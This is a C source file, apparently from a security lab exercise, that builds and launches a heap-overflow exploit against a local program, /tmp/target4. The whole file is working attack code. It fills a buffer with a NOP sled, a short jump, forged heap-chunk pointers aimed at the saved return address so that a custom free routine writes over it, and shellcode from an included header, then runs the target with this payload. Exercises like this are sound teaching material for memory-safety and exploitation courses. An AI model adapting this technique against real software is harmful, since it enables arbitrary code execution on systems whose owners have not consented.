#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET      "/tmp/target4"
#define NOP         0x90                // NOP instruction
#define ATTACK_SIZE 1024                // Size of the attack_string

int main(void)
{
    char *args[3];
    char *env[1];

    int i;                              // Loop counter
    char * attack_string;               // The attack_string, oy this comment is redundant
    char * char_ptr;                    // Pointer for traversing attack_string 1 byte at a time
    long *addr_ptr;                     // Pointer for traversing attack_string 4 bytes at a time
    int fake_right;
    int chunk_left;
    int chunk_right;

    // Allocate memory for the attack string
    attack_string = malloc(sizeof(char) * ATTACK_SIZE);

    addr_ptr = (long *)attack_string;
    char_ptr = attack_string;
    chunk_left  = 0x8049a48;            // Address of our attack string
    chunk_right = 0xbffff60c;           // Address of the saved eip
    fake_right  = 0x87654321;           // fake address that passes the conditions in tfree

    // 1. Fill attack_string with NOPs
    for(i = 0; i < ATTACK_SIZE; i++) {
        attack_string[i] = NOP;
    }

    // 2. Add 3 byte jmp
    *(char_ptr + 2) = 0xeb;
    *(char_ptr + 3) = 0x03;

    // 3. Set the fake chunk addresses
    *(addr_ptr + 1) = fake_right;
    *(addr_ptr + 126) = chunk_left;
    *(addr_ptr + 127) = chunk_right;

    // 4. Copy shellcode to p's region
    char_ptr = attack_string + 504 - strlen(shellcode) ;
    for(i = 0; i < strlen(shellcode); i++) {
        *(char_ptr++) = shellcode[i];
    }

    // 6. Add a NUL character to the end of the attack_string
    attack_string[ATTACK_SIZE - 1] = '\0';

    args[0] = TARGET;
    args[1] = attack_string;
    args[2] = NULL;

    if(0 > execve(TARGET, args, env)) {
        fprintf(stderr, "execve failed.\n");
    }

    return 0;
}
